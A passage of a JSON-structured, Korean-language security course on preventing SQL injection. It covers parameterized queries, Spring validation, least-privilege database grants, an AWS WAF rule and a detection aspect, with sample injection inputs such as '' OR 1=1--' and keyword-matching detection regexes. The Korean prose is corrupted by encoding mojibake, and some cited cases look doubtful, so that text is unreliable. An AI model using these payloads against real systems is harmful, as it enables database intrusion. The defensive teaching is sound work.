â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                                 â”‚\nâ”‚   [PreparedStatement ë°©ì‹] - ì•ˆì „!                               â”‚\nâ”‚   \"SELECT * FROM users WHERE name = ?\"                          â”‚\nâ”‚                                                                 â”‚\nâ”‚   1. SQL êµ¬ì¡° ë¨¼ì € ì»´íŒŒì¼ (? ìë¦¬ëŠ” \"ê°’\"ìœ¼ë¡œ ì˜ˆì•½)                â”‚\nâ”‚   2. ê°’ì„ ë°”ì¸ë”©í•  ë•Œ ì´ìŠ¤ì¼€ì´í”„ ì²˜ë¦¬                             â”‚\nâ”‚                                                                 â”‚\nâ”‚   input = \"admin'--\"                                            â”‚\nâ”‚   ê²°ê³¼: SELECT * FROM users WHERE name = 'admin''--'            â”‚\nâ”‚                                           ^^^^^^                â”‚\nâ”‚         'ê°€ ''ë¡œ ì´ìŠ¤ì¼€ì´í”„ â†’ ë‹¨ìˆœ ë¬¸ìì—´ë¡œ ì²˜ë¦¬ â†’ ê³µê²© ì‹¤íŒ¨       â”‚\nâ”‚                                                                 â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```"
            },
            {
                "type": "tip",
                "title": "ğŸ’¡ ì‹¤ë¬´ ì²´í¬ë¦¬ìŠ¤íŠ¸ & ë©´ì ‘",
                "content": "### ì‹¤ë¬´ ì²´í¬ë¦¬ìŠ¤íŠ¸\n\n```\n[ í”„ë¡ íŠ¸ì—”ë“œ ]\nâ–¡ ì…ë ¥ê°’ í´ë¼ì´ì–¸íŠ¸ ê²€ì¦ (UXìš©, ë³´ì•ˆìš© ì•„ë‹˜)\nâ–¡ SQL íŠ¹ìˆ˜ë¬¸ì ê²½ê³  í‘œì‹œ (ì‚¬ìš©ì í”¼ë“œë°±)\n\n[ ë°±ì—”ë“œ ]\nâ–¡ ëª¨ë“  DB ì¿¼ë¦¬ PreparedStatement ì‚¬ìš©\nâ–¡ ORM ì‚¬ìš© ì‹œ Native Query ê²€í† \nâ–¡ ë™ì  ì¿¼ë¦¬ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ê²€ì¦\nâ–¡ ì…ë ¥ê°’ ê¸¸ì´ ì œí•œ\nâ–¡ ì—ëŸ¬ ë©”ì‹œì§€ì— SQL ì •ë³´ ë…¸ì¶œ ê¸ˆì§€\nâ–¡ DB ê³„ì • ìµœì†Œ ê¶Œí•œ ì›ì¹™\n\n[ í…ŒìŠ¤íŠ¸ ]\nâ–¡ SQL Injection í˜ì´ë¡œë“œ í…ŒìŠ¤íŠ¸\nâ–¡ SQLMapìœ¼ë¡œ ìë™í™” ìŠ¤ìº”\nâ–¡ ì½”ë“œ ë¦¬ë·° ì‹œ ì¿¼ë¦¬ ìƒì„± ë°©ì‹ í™•ì¸\n\n[ ëª¨ë‹ˆí„°ë§ ]\nâ–¡ WAFì—ì„œ SQL Injection íŒ¨í„´ íƒì§€\nâ–¡ ë¹„ì •ìƒ ì¿¼ë¦¬ ë¡œê¹…/ì•Œë¦¼\nâ–¡ DB ì¿¼ë¦¬ ì‹¤í–‰ ëª¨ë‹ˆí„°ë§\n```\n\n### ë©´ì ‘ ì˜ˆìƒ ì§ˆë¬¸\n\n```\nğŸ‘¶ ì£¼ë‹ˆì–´ ë ˆë²¨:\nQ: SQL Injectionì´ ë¬´ì—‡ì¸ê°€ìš”?\nA: ì‚¬ìš©ì ì…ë ¥ê°’ì´ SQL ì¿¼ë¦¬ì˜ ì¼ë¶€ë¡œ ì‹¤í–‰ë˜ì–´ DBë¥¼\n   ì¡°ì‘í•  ìˆ˜ ìˆëŠ” ê³µê²©ì…ë‹ˆë‹¤. ë¬¸ìì—´ ì—°ê²° ëŒ€ì‹ \n   PreparedStatementë¥¼ ì‚¬ìš©í•˜ì—¬ ë°©ì–´í•©ë‹ˆë‹¤.\n\nQ: PreparedStatementê°€ ì•ˆì „í•œ ì´ìœ ëŠ”?\nA: SQL êµ¬ì¡°ê°€ ë¨¼ì € ì»´íŒŒì¼ë˜ê³ , ì‚¬ìš©ì ì…ë ¥ì€ í•­ìƒ\n   \"ë°ì´í„°\"ë¡œë§Œ ì²˜ë¦¬ë˜ì–´ SQL ëª…ë ¹ìœ¼ë¡œ í•´ì„ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.\n\nğŸ‘¨â€ğŸ’¼ ì‹œë‹ˆì–´ ë ˆë²¨:\nQ: ORMì„ ì‚¬ìš©í•´ë„ SQL Injectionì´ ë°œìƒí•  ìˆ˜ ìˆë‚˜ìš”?\nA: ë„¤. Native Queryë‚˜ ë™ì  ì¿¼ë¦¬ ìƒì„± ì‹œ ë¬¸ìì—´ ì—°ê²°ì„\n   ì‚¬ìš©í•˜ë©´ ì·¨ì•½í•©ë‹ˆë‹¤. Criteria APIë‚˜ QueryDSLì˜\n   íŒŒë¼ë¯¸í„° ë°”ì¸ë”©ì„ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.\n\nQ: SQL Injectionì„ íƒì§€í•˜ëŠ” ë°©ë²•ì€?\nA: WAF ê·œì¹™, ì •ê·œí‘œí˜„ì‹ íŒ¨í„´ ë§¤ì¹­, ì¿¼ë¦¬ íŒŒë¼ë¯¸í„° ë¶„ì„,\n   SQLMap ê°™ì€ ìë™í™” ë„êµ¬, SAST/DAST ë„êµ¬ë¡œ íƒì§€í•©ë‹ˆë‹¤.\n   ê·¼ë³¸ì ìœ¼ë¡œëŠ” ì‹œíì–´ ì½”ë”©ì´ í•„ìˆ˜ì…ë‹ˆë‹¤.\n```\n\n### ë” ê³µë¶€í•  ìë£Œ\n\n```\nğŸ“š ê³µì‹ ë¬¸ì„œ:\n- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection\n- OWASP Testing Guide: SQL Injection Testing\n- CWE-89: SQL Injection\n\nğŸ”§ ì‹¤ìŠµ ë„êµ¬:\n- SQLMap: ìë™í™”ëœ SQL Injection í…ŒìŠ¤íŠ¸\n- Burp Suite: ì›¹ ì·¨ì•½ì  ìŠ¤ìºë„ˆ\n- OWASP WebGoat: SQL Injection ì‹¤ìŠµ\n\nğŸ“Š CVE ì‚¬ë¡€:\n- CVE-2023-34362: MOVEit SQL Injection\n- CVE-2021-27896: Progress MOVEit Transfer\n```"
            }
        ]
    },

    "02_ê³µê²©/sql-injection-prevent": {
        "title": "SQL ì¸ì ì…˜ ë°©ì–´ ì™„ë²½ ê°€ì´ë“œ",
        "description": "SQL ì¸ì ì…˜ ê³µê²©ì— ëŒ€í•œ ë‹¤ì¸µ ë°©ì–´ ì „ëµì„ í•™ìŠµí•©ë‹ˆë‹¤.",
        "sections": [
            {
                "type": "concept",
                "title": "ğŸ¯ SQL ì¸ì ì…˜ ë°©ì–´ ì™„ì „ ì •ë³µ",
                "content": "## í•œ ì¤„ ìš”ì•½\n> **ë‹¤ì¸µ ë°©ì–´ ì „ëµ** - ì½”ë“œ, DB, ì¸í”„ë¼ ë ˆë²¨ì—ì„œ ì¤‘ì²© ë°©ì–´!\n\n---\n\n## ğŸ’¡ ë¹„ìœ ë¡œ ì´í•´í•˜ê¸°\n\n```\nğŸ° ì¤‘ì„¸ ì„± ë°©ì–´ì— ë¹„ìœ í•˜ë©´:\n\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚           ë‹¤ì¸µ ë°©ì–´ ì „ëµ                 â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                         â”‚\nâ”‚   1ì¸µ: ì„±ë²½ (WAF)                        â”‚\nâ”‚        â””â”€â”€ ëª…ë°±í•œ ê³µê²© ì°¨ë‹¨              â”‚\nâ”‚                                         â”‚\nâ”‚   2ì¸µ: í•´ì (ì…ë ¥ ê²€ì¦)                  â”‚\nâ”‚        â””â”€â”€ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ ì…ë ¥ í•„í„°ë§         â”‚\nâ”‚                                         â”‚\nâ”‚   3ì¸µ: ì„±ë¬¸ (PreparedStatement)          â”‚\nâ”‚        â””â”€â”€ SQL ì£¼ì… ì›ì²œ ì°¨ë‹¨            â”‚\nâ”‚                                         â”‚\nâ”‚   4ì¸µ: ë‚´ì„± (ìµœì†Œ ê¶Œí•œ)                  â”‚\nâ”‚        â””â”€â”€ ì¹¨íˆ¬í•´ë„ í”¼í•´ ìµœì†Œí™”          â”‚\nâ”‚                                         â”‚\nâ”‚   5ì¸µ: ê°ì‹œíƒ‘ (ëª¨ë‹ˆí„°ë§)                 â”‚\nâ”‚        â””â”€â”€ ì´ìƒ ì§•í›„ íƒì§€                â”‚\nâ”‚                                         â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n---\n\n## ğŸš¨ ë°©ì–´ ì‹¤íŒ¨ ì‚¬ë¡€ì—ì„œ ë°°ìš°ê¸°\n\n### ë°©ì–´ê°€ ì‹¤íŒ¨í•œ ì´ìœ :\n```\nğŸ“Œ 2019ë…„ Capital One í•´í‚¹\nì‹¤íŒ¨ ì›ì¸: WAF ìš°íšŒ + ê³¼ë„í•œ DB ê¶Œí•œ\nêµí›ˆ: ë‹¨ì¼ ë°©ì–´ì„  ì˜ì¡´ ê¸ˆì§€, ìµœì†Œ ê¶Œí•œ ì›ì¹™\n\nğŸ“Œ 2020ë…„ Marriott 2ì°¨ ìœ ì¶œ\nì‹¤íŒ¨ ì›ì¸: ë ˆê±°ì‹œ ì½”ë“œ ë¯¸ì ê²€\nêµí›ˆ: ê¸°ì¡´ ì½”ë“œë„ ì •ê¸° ë³´ì•ˆ ê°ì‚¬ í•„ìš”\n```\n\n### ë°©ì–´ ì„±ê³µ ì‚¬ë¡€:\n```\nğŸ“Œ Google Bug Bounty ì‚¬ë¡€\nì„±ê³µ ìš”ì¸: ë‹¤ì¸µ ë°©ì–´ + ìë™í™”ëœ ì½”ë“œ ë¶„ì„\nê²°ê³¼: ê³µê²© ì‹œë„ ìë™ ì°¨ë‹¨ ë° ë³´ê³ \n```"
            },
            {
                "type": "code",
                "title": "ğŸ’» ë‹¤ì¸µ ë°©ì–´ êµ¬í˜„",
                "content": "### ë°©ì–´ ì•„í‚¤í…ì²˜ ë‹¤ì´ì–´ê·¸ë¨\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                SQL Injection ë‹¤ì¸µ ë°©ì–´ ì•„í‚¤í…ì²˜                  â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                                 â”‚\nâ”‚   [í•´ì»¤ ìš”ì²­]                                                    â”‚\nâ”‚       â”‚                                                         â”‚\nâ”‚       â”‚ 1ï¸âƒ£ WAF (Web Application Firewall)                       â”‚\nâ”‚       â”‚    â””â”€â”€ SQL í‚¤ì›Œë“œ íŒ¨í„´ íƒì§€/ì°¨ë‹¨                          â”‚\nâ”‚       â”‚    â””â”€â”€ ' OR 1=1-- ê°™ì€ íŒ¨í„´ ì°¨ë‹¨                         â”‚\nâ”‚       â–¼                                                         â”‚\nâ”‚   [API Gateway]                                                  â”‚\nâ”‚       â”‚                                                         â”‚\nâ”‚       â”‚ 2ï¸âƒ£ Rate Limiting                                        â”‚\nâ”‚       â”‚    â””â”€â”€ ìë™í™” ê³µê²© ì†ë„ ì œí•œ                             â”‚\nâ”‚       â–¼                                                         â”‚\nâ”‚   [Controller]                                                   â”‚\nâ”‚       â”‚                                                         â”‚\nâ”‚       â”‚ 3ï¸âƒ£ ì…ë ¥ê°’ ê²€ì¦ (Validation)                             â”‚\nâ”‚       â”‚    â””â”€â”€ íƒ€ì…, ê¸¸ì´, í˜•ì‹, í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸                     â”‚\nâ”‚       â–¼                                                         â”‚\nâ”‚   [Service]                                                      â”‚\nâ”‚       â”‚                                                         â”‚\nâ”‚       â”‚ 4ï¸âƒ£ ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ ê²€ì¦                                   â”‚\nâ”‚       â”‚    â””â”€â”€ ê¶Œí•œ ì²´í¬, ë…¼ë¦¬ì  ê²€ì¦                            â”‚\nâ”‚       â–¼                                                         â”‚\nâ”‚   [Repository]                                                   â”‚\nâ”‚       â”‚                                                         â”‚\nâ”‚       â”‚ 5ï¸âƒ£ PreparedStatement / ORM                              â”‚\nâ”‚       â”‚    â””â”€â”€ íŒŒë¼ë¯¸í„° ë°”ì¸ë”© (í•µì‹¬ ë°©ì–´)                        â”‚\nâ”‚       â–¼                                                         â”‚\nâ”‚   [Database]                                                     â”‚\nâ”‚       â”‚                                                         â”‚\nâ”‚       â”‚ 6ï¸âƒ£ ìµœì†Œ ê¶Œí•œ ê³„ì •                                       â”‚\nâ”‚       â”‚    â””â”€â”€ SELECTë§Œ í—ˆìš©, DROP ë¶ˆê°€                          â”‚\nâ”‚                                                                 â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n### ë ˆì´ì–´ë³„ êµ¬í˜„ (Spring Boot 3.x)\n\n```java\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// ë ˆì´ì–´ 1: ì…ë ¥ê°’ ê²€ì¦ (Controller)\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@RestController\n@RequestMapping(\"/api/users\")\n@Validated\npublic class UserController {\n    \n    @GetMapping(\"/search\")\n    public List<UserDto> searchUsers(\n            @RequestParam @Size(min = 1, max = 50) \n            @Pattern(regexp = \"^[a-zA-Z0-9ê°€-í£\\\\s]+$\", \n                     message = \"íŠ¹ìˆ˜ë¬¸ì ì‚¬ìš© ë¶ˆê°€\") \n            String keyword,\n            \n            @RequestParam(defaultValue = \"name\") \n            @Pattern(regexp = \"^(name|email|createdAt)$\") \n            String sortBy,\n            \n            @RequestParam(defaultValue = \"0\") \n            @Min(0) @Max(1000) \n            int page) {\n        \n        return userService.searchUsers(keyword, sortBy, page);\n    }\n}\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// ë ˆì´ì–´ 2: ì»¤ìŠ¤í…€ ê²€ì¦ ì–´ë…¸í…Œì´ì…˜\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@Target({ElementType.FIELD, ElementType.PARAMETER})\n@Retention(RetentionPolicy.RUNTIME)\n@Constraint(validatedBy = SafeStringValidator.class)\npublic @interface SafeString {\n    String message() default \"í—ˆìš©ë˜ì§€ ì•ŠëŠ” ë¬¸ìê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤\";\n    Class<?>[] groups() default {};\n    Class<? extends Payload>[] payload() default {};\n}\n\npublic class SafeStringValidator implements ConstraintValidator<SafeString, String> {\n    \n    // SQL Injection ìœ„í—˜ íŒ¨í„´\n    private static final Pattern DANGEROUS_PATTERN = Pattern.compile(\n        \"(?i)(\\\\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|CREATE|ALTER|EXEC|EXECUTE)\\\\b)\" +\n        \"|(--|;|'|\\\"\" + \n        \"|(\\\\b(OR|AND)\\\\b\\\\s*['\\\"]?\\\\s*(1|true)\\\\s*=\\\\s*(1|true)))\"\n    );\n    \n    @Override\n    public boolean isValid(String value, ConstraintValidatorContext context) {\n        if (value == null) return true;\n        return !DANGEROUS_PATTERN.matcher(value).find();\n    }\n}\n```\n\n### Repository ë ˆì´ì–´ - í•µì‹¬ ë°©ì–´\n\n```java\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// ë ˆì´ì–´ 3: ì•ˆì „í•œ Repository íŒ¨í„´\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@Repository\npublic class SecureUserRepository {\n    \n    @Autowired\n    private EntityManager em;\n    \n    // âœ… Criteria API - íƒ€ì… ì•ˆì „í•œ ë™ì  ì¿¼ë¦¬\n    public List<User> searchUsersSecure(String keyword, String sortBy, int page) {\n        CriteriaBuilder cb = em.getCriteriaBuilder();\n        CriteriaQuery<User> query = cb.createQuery(User.class);\n        Root<User> user = query.from(User.class);\n        \n        // ê²€ìƒ‰ ì¡°ê±´ (íŒŒë¼ë¯¸í„° ë°”ì¸ë”© ìë™)\n        List<Predicate> predicates = new ArrayList<>();\n        if (keyword != null && !keyword.isBlank()) {\n            predicates.add(cb.or(\n                cb.like(cb.lower(user.get(\"name\")), \"%\" + keyword.toLowerCase() + \"%\"),\n                cb.like(cb.lower(user.get(\"email\")), \"%\" + keyword.toLowerCase() + \"%\")\n            ));\n        }\n        \n        query.where(predicates.toArray(new Predicate[0]));\n        \n        // ì •ë ¬ (í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ë¡œ ê²€ì¦ëœ ì»¬ëŸ¼ë§Œ)\n        if (ALLOWED_SORT_COLUMNS.contains(sortBy)) {\n            query.orderBy(cb.asc(user.get(sortBy)));\n        }\n        \n        return em.createQuery(query)\n                 .setFirstResult(page * 20)\n                 .setMaxResults(20)\n                 .getResultList();\n    }\n    \n    private static final Set<String> ALLOWED_SORT_COLUMNS = \n        Set.of(\"name\", \"email\", \"createdAt\");\n}\n```"
            },
            {
                "type": "code",
                "title": "ğŸ›¡ï¸ ì¸í”„ë¼ & DB ë ˆë²¨ ë°©ì–´",
                "content": "### ë°ì´í„°ë² ì´ìŠ¤ ë³´ì•ˆ ì„¤ì •\n\n```sql\n-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n-- DB ë ˆë²¨ ë°©ì–´: ìµœì†Œ ê¶Œí•œ ì›ì¹™\n-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n-- 1. ì• í”Œë¦¬ì¼€ì´ì…˜ ì „ìš© ê³„ì • ìƒì„± (DROP, ALTER ê¶Œí•œ ì—†ìŒ)\nCREATE USER 'app_user'@'localhost' IDENTIFIED BY 'secure_password';\n\n-- 2. í•„ìš”í•œ ê¶Œí•œë§Œ ë¶€ì—¬\nGRANT SELECT, INSERT, UPDATE ON myapp.users TO 'app_user'@'localhost';\nGRANT SELECT, INSERT, UPDATE, DELETE ON myapp.orders TO 'app_user'@'localhost';\n-- DELETE ê¶Œí•œë„ ê¼­ í•„ìš”í•œ í…Œì´ë¸”ì—ë§Œ!\n\n-- 3. ì‹œìŠ¤í…œ í…Œì´ë¸” ì ‘ê·¼ ì°¨ë‹¨\nREVOKE ALL ON mysql.* FROM 'app_user'@'localhost';\nREVOKE ALL ON information_schema.* FROM 'app_user'@'localhost';\n\n-- 4. Stored Procedureë¡œ ì¿¼ë¦¬ ì œí•œ\nDELIMITER //\nCREATE PROCEDURE get_user_by_id(IN user_id BIGINT)\nBEGIN\n    -- ì •í•´ì§„ ì¿¼ë¦¬ë§Œ ì‹¤í–‰ ê°€ëŠ¥\n    SELECT id, name, email, created_at \n    FROM users \n    WHERE id = user_id;\nEND //\nDELIMITER ;\n\nGRANT EXECUTE ON PROCEDURE myapp.get_user_by_id TO 'app_user'@'localhost';\n```\n\n### WAF ê·œì¹™ ì„¤ì • (AWS WAF ì˜ˆì‹œ)\n\n```json\n// AWS WAF SQL Injection Rule\n{\n  \"Name\": \"SQLInjectionRule\",\n  \"Priority\": 1,\n  \"Statement\": {\n    \"OrStatement\": {\n      \"Statements\": [\n        {\n          \"SqliMatchStatement\": {\n            \"FieldToMatch\": {\n              \"QueryString\": {}\n            },\n            \"TextTransformations\": [\n              { \"Priority\": 0, \"Type\": \"URL_DECODE\" },\n              { \"Priority\": 1, \"Type\": \"HTML_ENTITY_DECODE\" },\n              { \"Priority\": 2, \"Type\": \"LOWERCASE\" }\n            ]\n          }\n        },\n        {\n          \"SqliMatchStatement\": {\n            \"FieldToMatch\": {\n              \"Body\": {}\n            },\n            \"TextTransformations\": [\n              { \"Priority\": 0, \"Type\": \"URL_DECODE\" },\n              { \"Priority\": 1, \"Type\": \"HTML_ENTITY_DECODE\" }\n            ]\n          }\n        }\n      ]\n    }\n  },\n  \"Action\": { \"Block\": {} }\n}\n```\n\n### ëª¨ë‹ˆí„°ë§ & ì•Œë¦¼ ì„¤ì •\n\n```java\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// SQL Injection ì‹œë„ íƒì§€ ë° ì•Œë¦¼\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@Aspect\n@Component\n@Slf4j\npublic class SqlInjectionDetectorAspect {\n    \n    @Autowired\n    private AlertService alertService;\n    \n    private static final Pattern SQL_INJECTION_PATTERN = Pattern.compile(\n        \"(?i)\" +\n        \"(\\\\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|CREATE|ALTER)\\\\b)\" +\n        \"|(--|#|/\\\\*|\\\\*/|;)\" +\n        \"|(\\\\b(OR|AND)\\\\b\\\\s+\\\\d+\\\\s*=\\\\s*\\\\d+)\"\n    );\n    \n    @Before(\"execution(* com.myapp.repository.*.*(..))\")\n    public void detectSqlInjection(JoinPoint joinPoint) {\n        Object[] args = joinPoint.getArgs();\n        \n        for (Object arg : args) {\n            if (arg instanceof String) {\n                String value = (String) arg;\n                if (SQL_INJECTION_PATTERN.matcher(value).find()) {\n                    String method = joinPoint.getSignature().toShortString();\n                    \n                    log.warn(\"[SQL INJECTION ATTEMPT] Method: {}, Value: {}\", \n                             method, value);\n                    \n                    // ë³´ì•ˆíŒ€ ì•Œë¦¼\n                    alertService.sendSecurityAlert(\n                        \"SQL Injection ì‹œë„ íƒì§€\",\n                        String.format(\"Method: %s, Input: %s\", method, value)\n                    );\n                    \n                    // ìš”ì²­ ì°¨ë‹¨\n                    throw new SecurityException(\"Malicious input detected\");\n                }\n            }\n        }\n    }\n}\n```"
            },
            {
                "type": "tip",
                "title": "ğŸ’¡ ì‹¤ë¬´ ì²´í¬ë¦¬ìŠ¤íŠ¸ & ë©´ì ‘",
                "content": "### ì‹¤ë¬´ ì²´í¬ë¦¬ìŠ¤íŠ¸ (ìƒì„¸)\n\n```\n[ ì½”ë“œ ë ˆë²¨ - í•„ìˆ˜ ]\nâ–¡ ëª¨ë“  DB ì¿¼ë¦¬ì— PreparedStatement ì‚¬ìš©\nâ–¡ JPA/Hibernate ì‚¬ìš© ì‹œ Native Query ì ê²€\nâ–¡ ë™ì  ì¿¼ë¦¬ëŠ” Criteria API ë˜ëŠ” QueryDSL ì‚¬ìš©\nâ–¡ ì •ë ¬/í•„í„° ì»¬ëŸ¼ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ê²€ì¦\nâ–¡ ì…ë ¥ê°’ íƒ€ì…, ê¸¸ì´, í˜•ì‹ ê²€ì¦\nâ–¡ ì—ëŸ¬ ë©”ì‹œì§€ì— SQL ì •ë³´ ë…¸ì¶œ ê¸ˆì§€\n\n[ DB ë ˆë²¨ - í•„ìˆ˜ ]\nâ–¡ ì• í”Œë¦¬ì¼€ì´ì…˜ ê³„ì • ìµœì†Œ ê¶Œí•œ\nâ–¡ DROP, ALTER, CREATE ê¶Œí•œ ì œê±°\nâ–¡ ì‹œìŠ¤í…œ í…Œì´ë¸” ì ‘ê·¼ ì°¨ë‹¨\nâ–¡ ë¯¼ê° í…Œì´ë¸” ì ‘ê·¼ ê°ì‚¬ ë¡œê·¸\n\n[ ì¸í”„ë¼ ë ˆë²¨ - ê¶Œì¥ ]\nâ–¡ WAF SQL Injection ë£° í™œì„±í™”\nâ–¡ Rate Limiting ì„¤ì •\nâ–¡ ì´ìƒ ì¿¼ë¦¬ íŒ¨í„´ ëª¨ë‹ˆí„°ë§\nâ–¡ ìë™ ì•Œë¦¼ ì„¤ì •\n\n[ í…ŒìŠ¤íŠ¸ - í•„ìˆ˜ ]\nâ–¡ SQLMap ìë™ ìŠ¤ìº”\nâ–¡ ìˆ˜ë™ í˜ì´ë¡œë“œ í…ŒìŠ¤íŠ¸\nâ–¡ ì½”ë“œ ë¦¬ë·° ì²´í¬ë¦¬ìŠ¤íŠ¸\nâ–¡ CI/CDì— SAST ë„êµ¬ í†µí•©\n```\n\n### ë©´ì ‘ ì˜ˆìƒ ì§ˆë¬¸\n\n```\nğŸ‘¶ ì£¼ë‹ˆì–´ ë ˆë²¨:\nQ: PreparedStatement vs Statement ì°¨ì´ì ì€?\nA: StatementëŠ” SQLì„ ë¬¸ìì—´ë¡œ ì‹¤í–‰í•˜ì—¬ Injectionì— ì·¨ì•½.\n   PreparedStatementëŠ” SQL êµ¬ì¡°ë¥¼ ë¯¸ë¦¬ ì»´íŒŒì¼í•˜ê³ \n   íŒŒë¼ë¯¸í„°ë¥¼ ë°”ì¸ë”©í•˜ì—¬ ì•ˆì „í•©ë‹ˆë‹¤.\n\nQ: ORMì„ ì‚¬ìš©í•˜ë©´ SQL Injectionì´ ë¶ˆê°€ëŠ¥í•œê°€ìš”?\nA: ì•„ë‹ˆìš”. Native Queryë‚˜ ë¬¸ìì—´ ì—°ê²° ë°©ì‹ìœ¼ë¡œ\n   ë™ì  ì¿¼ë¦¬ë¥¼ ìƒì„±í•˜ë©´ ì—¬ì „íˆ ì·¨ì•½í•©ë‹ˆë‹¤.\n\nğŸ‘¨â€ğŸ’¼ ì‹œë‹ˆì–´ ë ˆë²¨:\nQ: ë‹¤ì¸µ ë°©ì–´ ì „ëµì„ ì„¤ëª…í•´ì£¼ì„¸ìš”.\nA: WAF(ë„¤íŠ¸ì›Œí¬), ì…ë ¥ê²€ì¦(ì• í”Œë¦¬ì¼€ì´ì…˜),\n   PreparedStatement(ì½”ë“œ), ìµœì†Œê¶Œí•œ(DB) ë“±\n   ì—¬ëŸ¬ ë ˆì´ì–´ì—ì„œ ë°©ì–´í•˜ì—¬ í•œ ë ˆì´ì–´ê°€ ëš«ë ¤ë„\n   ë‹¤ë¥¸ ë ˆì´ì–´ì—ì„œ 